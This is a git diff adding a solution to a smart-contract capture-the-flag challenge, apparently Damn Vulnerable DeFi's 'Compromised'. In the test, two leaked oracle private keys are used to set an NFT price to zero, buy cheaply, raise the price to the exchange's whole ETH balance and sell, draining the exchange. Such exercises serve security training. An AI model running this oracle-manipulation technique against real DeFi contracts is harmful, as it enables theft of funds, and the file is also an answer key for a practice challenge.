@@ -61,6 +61,28 @@ describe('Compromised challenge', function () {
 
     it('Exploit', async function () {        
         /** CODE YOUR EXPLOIT HERE */
+        let {privatekey0, privatekey1} = require("./decoder");
+
+        let wallet0 = new ethers.Wallet(privatekey0, attacker.provider);
+        let wallet1 = new ethers.Wallet(privatekey1, attacker.provider);
+
+        const SYMBOL = "DVNFT";
+      
+        await this.oracle.connect(wallet0).postPrice(SYMBOL, ethers.utils.parseEther('0', 'wei'));
+
+        await this.oracle.connect(wallet1).postPrice(SYMBOL, ethers.utils.parseEther('0', 'wei'));
+
+        await this.exchange.connect(attacker).buyOne({value:1});
+
+        await this.oracle.connect(wallet0).postPrice(SYMBOL, EXCHANGE_INITIAL_ETH_BALANCE)
+        await this.oracle.connect(wallet1).postPrice(SYMBOL, EXCHANGE_INITIAL_ETH_BALANCE)
+
+        await this.nftToken.connect(attacker).approve(this.exchange.address, 0);
+        await this.exchange.connect(attacker).sellOne(0);
+
+        // cleanup
+        await this.oracle.connect(wallet0).postPrice(SYMBOL, INITIAL_NFT_PRICE);
+        await this.oracle.connect(wallet1).postPrice(SYMBOL, INITIAL_NFT_PRICE);
     });
 
     after(async function () {
